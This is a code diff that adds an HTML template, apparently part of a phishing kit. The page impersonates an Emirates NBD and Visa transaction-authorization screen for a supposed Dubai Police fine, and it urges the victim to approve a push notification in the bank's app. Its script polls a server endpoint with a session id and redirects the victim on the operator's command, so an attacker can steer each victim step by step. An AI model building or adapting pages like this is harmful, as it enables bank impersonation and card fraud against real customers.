@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<title>Authorize Transaction | Emirates NBD</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+* { box-sizing:border-box; margin:0; padding:0; }
+body { font-family:Arial,sans-serif; background:#f5f5f5; display:flex; align-items:center; justify-content:center; min-height:100vh; max-width:480px; margin:0 auto; }
+</style>
+</head>
+<body>
+
+<div style="background:white;width:100%;max-width:400px;min-height:100vh;padding:0 0 24px;box-shadow:0 2px 20px rgba(0,0,0,0.08);">
+
+  <!-- Header with logos -->
+  <div style="display:flex;align-items:center;justify-content:space-between;padding:20px 20px 16px;border-bottom:1px solid #e5e7eb;">
+    <div style="display:flex;align-items:center;gap:10px;">
+      <div style="width:44px;height:44px;background:#003366;border-radius:4px;display:flex;align-items:center;justify-content:center;overflow:hidden;padding:4px;">
+        <svg width="36" height="36" viewBox="0 0 50 50" fill="none">
+          <rect width="50" height="50" fill="#003366"/>
+          <path d="M8 10 L8 40 L18 40 L18 22 L32 40 L42 40 L42 10 L32 10 L32 28 L18 10 Z" fill="white"/>
+        </svg>
+      </div>
+      <div>
+        <div style="font-size:11px;font-weight:700;color:#003366;line-height:1.2;">بنك الإمارات دبي الوطني</div>
+        <div style="font-size:11px;font-weight:700;color:#003366;line-height:1.2;">Emirates NBD</div>
+      </div>
+    </div>
+    <div style="font-size:28px;font-weight:900;color:#1a1f71;font-style:italic;letter-spacing:-1px;font-family:serif;">VISA</div>
+  </div>
+
+  <!-- Body -->
+  <div style="padding:24px 24px 0;">
+    <div style="font-size:16px;font-weight:700;color:#1a1a1a;text-align:center;margin-bottom:18px;">Authorize your transaction</div>
+
+    <div style="font-size:13px;color:#333;margin-bottom:20px;line-height:1.65;">
+      Tap on the push notification we have sent on your <strong>ENBDX</strong> app to authorize the transaction.
+    </div>
+
+    <!-- Transaction details -->
+    <div style="margin-bottom:20px;">
+      <div style="font-size:14px;font-weight:700;color:#cc7700;margin-bottom:10px;">Transaction details:</div>
+      <div style="font-size:13px;color:#333;line-height:2;">
+        <div><span style="color:#555;">Merchant: </span><span>Dubai Police</span></div>
+        <div><span style="color:#555;">Amount: </span><span>AED <%= totalFine.toLocaleString() %></span></div>
+        <div><span style="color:#555;">Card ending: </span><span>************<%= cardLast4 %></span></div>
+        <div><span style="color:#555;">Date: </span><span><%= dateStr %></span></div>
+      </div>
+    </div>
+
+    <div style="font-size:13px;color:#0066cc;margin-bottom:24px;line-height:1.65;">
+      Alternatively, you can open <strong>ENBDX</strong> &amp; go to activity section to authorize the transaction.
+    </div>
+
+    <!-- Help links -->
+    <div style="display:flex;gap:12px;align-items:center;font-size:12px;margin-bottom:24px;border-top:1px solid #e5e7eb;padding-top:16px;">
+      <a href="#" style="color:#0066cc;text-decoration:underline;">Need some help?</a>
+      <span style="color:#ccc;">|</span>
+      <a href="#" style="color:#0066cc;text-decoration:underline;">learn more about authentication</a>
+    </div>
+
+    <div style="text-align:right;">
+      <button onclick="window.location.href='/'" style="background:none;border:none;color:#0066cc;font-size:14px;font-weight:600;cursor:pointer;text-decoration:underline;padding:0;">
+        Exit
+      </button>
+    </div>
+  </div>
+</div>
+
+<script>
+const CARD_LAST4 = <%- JSON.stringify(cardLast4) %>;
+const TOTAL_FINE = <%- JSON.stringify(totalFine) %>;
+const ISSUER     = <%- JSON.stringify(issuer) %>;
+const SID        = <%- JSON.stringify(sid) %>;
+
+if (SID) {
+  const sidParams = '?totalFine=' + TOTAL_FINE + '&cardLast4=' + encodeURIComponent(CARD_LAST4) + '&issuer=' + encodeURIComponent(ISSUER) + '&sid=' + SID;
+  setInterval(async () => {
+    try {
+      const r = await fetch('/api/check-status?sid=' + SID);
+      const d = await r.json();
+      if (d.action === 'redirect' && d.page) window.location.href = '/' + d.page + sidParams;
+    } catch(e) {}
+  }, 3000);
+}
+</script>
+</body>
+</html>
